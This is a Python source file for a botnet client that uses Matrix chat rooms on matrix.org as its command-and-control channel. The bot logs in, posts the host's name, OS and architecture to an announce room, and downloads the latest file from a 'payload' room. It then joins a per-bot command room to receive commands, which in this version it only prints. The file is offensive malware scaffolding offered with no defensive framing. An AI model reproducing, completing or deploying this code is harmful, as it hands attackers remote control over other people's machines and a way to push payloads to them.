import json
import platform
import socket
import uuid
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
import requests
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv

load_dotenv()
MATRIX_HOMESERVER = "https://matrix.org"
USER_NAME = os.getenv('USER_NAME')  
PASSWORD = os.getenv('PASSWORD')
ROOM_ID = os.getenv('ROOM_ID')
PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"

class BotnetController:
    access_token: str
    announce_room: Room
    command_room: Room
    
    announce_listener: uuid.UUID
    command_listener: uuid.UUID
    
    def __init__(self):
        self.bot_id = str(uuid.uuid4())
        self.client = MatrixClient(MATRIX_HOMESERVER)

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        # check if already joined, if not join the room
        try:
            room = self.client.rooms[roomid]
            print(f"Already joined room: {room.display_name}")
        except KeyError:
            room = self.client.join_room(roomid)
            print(f"Joined room: {room.display_name}")
        return room
        
    def announce(self):
        status = self.announce_room.send_text(
            f"CONNECT:{self.get_system_info()}"
        )
        
    def download_file(self, event, download_dir="downloads"):
        content = event["content"]
        filename = content.get("body", "payload_file")
        filepath = os.path.join(download_dir, filename)
        os.makedirs(download_dir, exist_ok=True)
        
        # extract server and media ID from mxc URL
        mxc_url = content['url']
        durl = MATRIX_DOWNLOAD_PREFIX + mxc_url[6:]
        
        # download 
        response = requests.get(durl, headers={"Authorization": f"Bearer {self.client.token}"})
        response.raise_for_status()
        
        # save 
        with open(filepath, 'wb') as f:
            f.write(response.content)
        
        print(f"Downloaded file: {filepath}")
        return filepath
        
    def download_payload(self):
        payload_event = self.client.api.get_room_messages(
            PAYLOAD_ROOM_ID,
            "",
            "b",
            limit=1
        )
        self.download_file(payload_event["chunk"][0])
        
    def get_system_info(self):
        return json.dumps({
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "machine": platform.machine(),
            "bot_id": self.bot_id,
            "python_version": platform.python_version()
        })
        
    def on_announcement(self, room, event):
        msgbody: str = event["content"]["body"]
        if not msgbody.startswith("RESOLVE"):
            return
        
        botid, roomid = msgbody.removeprefix("RESOLVE ").split(":", 1)
        if botid == self.bot_id:
            self.command_room = self.join_room(roomid)
            self.client.remove_listener(self.announce_listener)
            self.command_listener = self.command_room.add_listener(self.on_command)
                
    def on_command(self, room, event):
        msgbody: str = event["content"]["body"]
        print(msgbody)

    def run(self):
        self.login()
        self.announce_room = self.join_room(ROOM_ID)
        
        self.announce_listener = self.announce_room.add_listener(self.on_announcement)
        self.client.start_listener_thread()
        
        self.announce()
        self.download_payload()
        
        while True:
            pass
        
        

if __name__ == "__main__":
    controller = BotnetController()
    controller.run()